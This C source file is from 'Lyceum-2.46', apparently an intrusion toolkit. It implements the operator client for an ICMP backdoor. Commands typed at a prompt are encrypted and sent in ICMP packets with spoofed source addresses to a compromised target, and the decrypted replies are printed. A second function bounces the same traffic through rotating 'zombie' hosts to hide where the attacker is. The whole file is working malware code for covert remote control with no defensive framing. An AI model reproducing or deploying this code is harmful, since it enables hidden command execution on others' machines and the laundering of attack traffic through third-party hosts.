/* 
 * Lyceum-2.46
 *
 * Copyright (c) 2004 phish <phish@hush.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in
 *    the
 *    documentation and/or other materials provided with the
 *    distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS
 * IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
 * TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
 * PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS
 * BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */



#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <netdb.h>

#include "icmp_bd.h"
#include "lib_icmp.h"
#include "key.h"
#include "zombie_funcs.h"

unsigned long realip;

char *get_icmp_proto_by_name (int);

int
icmp_backdoor_connect (unsigned long ip, unsigned long local_ip,
		       char *subnet_spoof, unsigned long source_ip,
		       int icmp_type)
{
  char buf[BUFSIZ];
  char rbuf[BUFSIZ];

  struct utsname localhost;
  struct hostent *hosts;
  struct timeval tv;
  struct in_addr addr;

  fd_set read;

  bzero (rbuf, BUFSIZ);
  bzero (buf, BUFSIZ);
  realip = local_ip;

  print_info (ICMP_BD);

  uname (&localhost);

  if (local_ip != 0)
    realip = local_ip;
  else
    {
      if ((hosts = gethostbyname (localhost.nodename)) != NULL)
	bcopy (hosts->h_addr, (char *) &realip, hosts->h_length);
      else
	{
	  fprintf (stderr, "Cant determine local ip, use -l\n");
	  exit (0);
	}
    }

  addr.s_addr = realip;
  printf ("local IP:   %s (use -l option to change)\n", inet_ntoa (addr));
  addr.s_addr = ip;
  printf ("Targer IP:  %s - Icmp %s(%d)\n\n", inet_ntoa (addr),
	  get_icmp_proto_by_name (icmp_type), icmp_type);
  printf
    ("WARNING: If you have not already done so then use the -u option\n         at the commandline to open a bi-spoof backdoor\n\n");
  printf ("\033[01;32m\[lyceum ICMP-bispoof@%s]# \033[00m",
	  localhost.nodename);

  ICMP_init ();

  FD_ZERO (&read);
  FD_SET (rsockfd, &read);

  while ((!ferror (stdin)) && (!feof (stdin)))
    {
      fgets (buf, BUFSIZ, stdin);
      buf[strlen (buf) - 1] = 0;

      if ((strncmp (buf, EXIT, strlen (EXIT))) == 0)
	break;

      else if ((strncmp (buf, CLEAR, strlen (CLEAR))) == 0)
	system ("clear");


      else if ((strncmp (buf, CLOSE, strlen (CLOSE))) == 0)
	{
	  if ((ICMP_send
	       (encrypt_string (KEY, (c_icmp_pkt (CLOSE, 0))), 0, ip,
		0, 0, subnet_spoof, source_ip, icmp_type)) == -1)
	    {
	      perror ("icmp_send()");
	      break;
	    }
	  break;
	}

      else
	{
	  if ((ICMP_send
	       (encrypt_string (KEY, (c_icmp_pkt (buf, 0))), 0, ip, 0,
		0, subnet_spoof, source_ip, icmp_type)) == -1)
	    {
	      perror ("icmp_send()");
	      break;
	    }

	  tv.tv_sec = ICMP_TIMEOUT;
	  tv.tv_usec = 0;

	  if (select (rsockfd + 1, &read, NULL, NULL, &tv))
	    {
	      if ((ICMP_recv (rbuf, MAXMESG, 1, icmp_type)) != -666)
		printf ("%s", decrypt_string (KEY, rbuf));
	      else
		perror ("recv()");
	    }
	  else
	    printf ("Timedout, try resending\n");
	}

      printf ("\033[01;32m\[lyceum ICMP-bispoof@%s]# \033[00m",
	      localhost.nodename);

      bzero (rbuf, BUFSIZ);
      bzero (buf, BUFSIZ);

    }

  /* deinitialization */

  ICMP_reset ();
  return 0;

}

int
icmp_bounce_backdoor_connect (unsigned long destination_ip,
			      unsigned long local_ip, unsigned long zombie_ip)
{
  char buf[BUFSIZ];
  char rbuf[BUFSIZ];
  char *temp;

  struct utsname localhost;
  struct hostent *hosts;
  struct timeval tv;
  struct in_addr addr;

  int toggle_sz = 0;
  unsigned long temp_ip = 0;

  fd_set read;

  bzero (rbuf, BUFSIZ);
  bzero (buf, BUFSIZ);
  realip = local_ip;

  zomb_t.zomb_flag = 0;
  zomb_t.zomb_max = 0;

  print_info (ICMP_BOUNCE_BD);

  uname (&localhost);

  if (local_ip != 0)
    realip = local_ip;
  else
    {
      if ((hosts = gethostbyname (localhost.nodename)) != NULL)
	bcopy (hosts->h_addr, (char *) &realip, hosts->h_length);
      else
	{
	  fprintf (stderr, "Cant determine local ip, use -l\n");
	  exit (0);
	}
    }

  addr.s_addr = realip;
  printf ("local IP:   %s (use -l option to change)\n", inet_ntoa (addr));
  addr.s_addr = destination_ip;
  printf ("Target IP:  %s - bouncing ", inet_ntoa (addr));
  addr.s_addr = zombie_ip;
  printf ("through %s\n\n", inet_ntoa (addr));
  printf
    ("WARNING: If you have not already done so then use the -u option\n         at the commandline to open a bounce backdoor\n\n");
  printf ("\033[01;32m\[lyceum ICMP-bounce@%s]# \033[00m",
	  localhost.nodename);

  ICMP_init ();

  FD_ZERO (&read);
  FD_SET (rsockfd, &read);

  while ((!ferror (stdin)) && (!feof (stdin)))
    {
      fgets (buf, BUFSIZ, stdin);
      buf[strlen (buf) - 1] = 0;

      if ((strncmp (buf, EXIT, strlen (EXIT))) == 0)
	break;

      else if ((strncmp (buf, CLEAR, strlen (CLEAR))) == 0)
	system ("clear");

      else if ((strncmp (buf, TSZ, strlen (TSZ))) == 0)
	toggle_sz = 1;

      else if ((strncmp (buf, LZ, strlen (LZ))) == 0)
	{
	  if ((temp = strtok (buf, " ")) == NULL)
	    break;
	  if ((temp = strtok (NULL, " ")) == NULL)
	    break;

	  zombie_ip = inet_addr (temp);
	  zomb_t.zomb_flag = 0;

	}

      else if ((strncmp (buf, LZL, strlen (LZL))) == 0)
	{
	  if ((temp = strtok (buf, " ")) == NULL)
	    break;
	  if ((temp = strtok (NULL, " ")) == NULL)
	    break;

	  zombie_list_init (temp);
	}

      else if ((strncmp (buf, CLOSE, strlen (CLOSE))) == 0)
	{
	  zombie_ip = zombie_update (zombie_ip);
	  if (toggle_sz)
	    temp_ip = zombie_update (zombie_ip);

	  if ((ICMP_send
	       (encrypt_string
		(KEY, (c_icmp_pkt (CLOSE, toggle_sz ? zombie_ip : temp_ip))),
		0, zombie_ip, 0, 0, NULL, destination_ip, ICMP_ECHO)) == -1)
	    {
	      perror ("icmp_send()");
	      break;
	    }
	  break;
	}

      else
	{

	  zombie_ip = zombie_update (zombie_ip);
	  if (toggle_sz)
	    temp_ip = zombie_update (zombie_ip);

	  if ((ICMP_send
	       (encrypt_string
		(KEY, (c_icmp_pkt (buf, toggle_sz ? temp_ip : zombie_ip))), 0,
		zombie_ip, 0, 0, NULL, destination_ip, ICMP_ECHO)) == -1)
	    {
	      perror ("icmp_send()");
	      break;
	    }

	  tv.tv_sec = ICMP_TIMEOUT;
	  tv.tv_usec = 0;

	  if (select (rsockfd + 1, &read, NULL, NULL, &tv))
	    {
	      if ((ICMP_recv (rbuf, MAXMESG, 1, ICMP_ECHOREPLY)) != -666)
		printf ("%s", decrypt_string (KEY, rbuf));
	      else
		perror ("recv()");
	    }
	  else
	    printf ("Timedout, try resending\n");
	}
      printf ("\033[01;32m\[lyceum ICMP-bounce@%s]# \033[00m",
	      localhost.nodename);

      bzero (rbuf, BUFSIZ);
      bzero (buf, BUFSIZ);

    }

  /* deinitialization */

  ICMP_reset ();
  return 0;

}
